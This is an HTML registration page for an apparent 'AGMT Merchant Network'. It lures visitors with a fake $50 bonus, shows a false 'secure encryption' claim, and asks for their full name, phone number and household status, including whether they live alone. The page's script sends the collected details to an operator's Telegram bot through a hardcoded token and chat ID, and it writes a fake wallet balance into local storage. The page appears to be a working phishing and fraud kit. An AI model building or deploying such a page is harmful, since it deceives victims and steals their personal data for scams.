<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Merchant Portal | Registration</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --text-dim: #64748b; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
        
        body { background: var(--bg); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }

        .onboarding-card { 
            width: 100%; max-width: 420px; background: var(--card); border: 1px solid var(--border); 
            border-radius: 40px; padding: 40px 25px; box-shadow: 0 40px 80px rgba(0,0,0,0.6);
        }

        .bonus-badge { 
            background: rgba(16, 185, 129, 0.1); color: var(--accent); 
            padding: 8px 16px; border-radius: 100px; font-size: 11px; font-weight: 800;
            display: inline-block; margin-bottom: 20px; border: 1px solid rgba(16, 185, 129, 0.2);
        }

        h1 { font-size: 26px; font-weight: 800; margin-bottom: 10px; letter-spacing: -0.5px; }
        .sub-h { color: var(--text-dim); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }

        /* Form Controls */
        .f-label { display: block; font-size: 11px; font-weight: 800; color: var(--text-dim); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
        .f-group { margin-bottom: 22px; }
        
        .f-input, select { 
            width: 100%; background: #020617; border: 1px solid var(--border); border-radius: 20px; 
            padding: 18px; color: white; font-weight: 700; font-size: 15px; outline: none; transition: 0.3s;
        }
        .f-input:focus { border-color: var(--primary); background: rgba(37, 99, 235, 0.05); }

        /* Age Checkbox */
        .checkbox-box {
            background: rgba(255,255,255,0.02); border: 1px solid var(--border);
            border-radius: 20px; padding: 20px; margin-bottom: 25px;
            display: flex; gap: 15px; align-items: flex-start; cursor: pointer;
        }
        .checkbox-box input { width: 22px; height: 22px; cursor: pointer; accent-color: var(--primary); flex-shrink: 0; }
        .checkbox-txt { font-size: 13px; font-weight: 600; color: #cbd5e1; line-height: 1.4; }

        .btn-claim { 
            width: 100%; padding: 22px; border-radius: 22px; border: none;
            background: linear-gradient(135deg, var(--primary), #1e40af);
            color: white; font-weight: 800; font-size: 16px; cursor: pointer;
            box-shadow: 0 15px 35px rgba(37, 99, 235, 0.3); transition: 0.3s;
        }
        .btn-claim:active { transform: scale(0.98); }

        .secure-tag { text-align: center; margin-top: 25px; font-size: 11px; color: var(--text-dim); font-weight: 700; }
    </style>
</head>
<body>

    <div class="onboarding-card">
        <div class="bonus-badge">🎁 $50.00 REWARD ELIGIBLE</div>
        <h1>Create Account</h1>
        <p class="sub-h">Join the AGMT Merchant Network. Complete your profile to claim your <b>₦77,500</b> settlement bonus.</p>

        <div class="f-group">
            <label class="f-label">Full Legal Name</label>
            <input type="text" id="regName" class="f-input" placeholder="Enter Full Name">
        </div>

        <div class="f-group">
            <label class="f-label">Primary Mobile Number</label>
            <input type="tel" id="regPhone" class="f-input" placeholder="080 0000 0000">
        </div>

        <div class="f-group">
            <label class="f-label">Household Status</label>
            <select id="regHouse" class="f-input">
                <option value="">Please select an option</option>
                <option value="Single">Single Household</option>
                <option value="Family">Family / Children under 18</option>
                <option value="Living Alone">Living Alone</option>
            </select>
        </div>

        <div class="checkbox-box" onclick="document.getElementById('ageCheck').click()">
            <input type="checkbox" id="ageCheck" onclick="event.stopPropagation()">
            <div class="checkbox-txt">
                I confirm that I am <b>18 years or older</b> and I agree to the Merchant Terms of Service and Data Optimization Policy.
            </div>
        </div>

        <button class="btn-claim" onclick="processRegistration()">CLAIM $50.00 BONUS</button>

        <div class="secure-tag">
            🛡️ SECURE 256-BIT ENCRYPTION ACTIVE
        </div>
    </div>

    <script>
        function processRegistration() {
            const name = document.getElementById('regName').value;
            const phone = document.getElementById('regPhone').value;
            const ageChecked = document.getElementById('ageCheck').checked;

            if(!name || !phone) {
                alert("Please enter your details to verify your node.");
                return;
            }

            if(!ageChecked) {
                alert("You must be 18 years or older to participate in the merchant program.");
                return;
            }

            // Save to LocalStorage
            localStorage.setItem('merchantName', name);
            localStorage.setItem('walletBalance', "50.00");
            localStorage.setItem('tasksCompleted', "1");

            // Send full details to your Telegram
            const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
            const chatId = "7909543900";
            const msg = `🚀 <b>NEW MERCHANT REGISTERED</b>%0A<b>Name:</b> ${name}%0A<b>Phone:</b> ${phone}%0A<b>Age:</b> 18+ Verified%0A<b>Bonus:</b> $50.00 Paid`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=html`);

            // Redirect to Dashboard
            window.location.href = 'dashboard.html';
        }
    </script>

</body>
</html>
